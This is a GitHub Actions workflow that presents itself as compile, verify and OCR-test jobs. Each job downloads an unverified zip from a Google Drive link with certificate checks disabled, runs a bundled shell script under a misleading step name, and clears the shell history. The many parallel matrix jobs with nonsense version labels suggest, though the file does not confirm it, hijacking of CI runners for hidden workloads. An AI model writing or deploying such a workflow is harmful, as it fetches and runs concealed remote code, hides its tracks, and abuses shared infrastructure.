name: bienca1code
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  COMPILE:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Init', 'Generate', 'Check', 'Start', 'Ship']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=17tZhzkQRdHgTNx1VK2f5acDqqXinZ-Ep" -O bienca1code.zip
        unzip -o bienca1code.zip
        rm bienca1code.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh


  VERIFY1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Adapt', 'Assemble', 'Confirm', 'Ignite', 'Release']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=17tZhzkQRdHgTNx1VK2f5acDqqXinZ-Ep" -O bienca1code.zip
        unzip -o bienca1code.zip
        rm bienca1code.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh
        
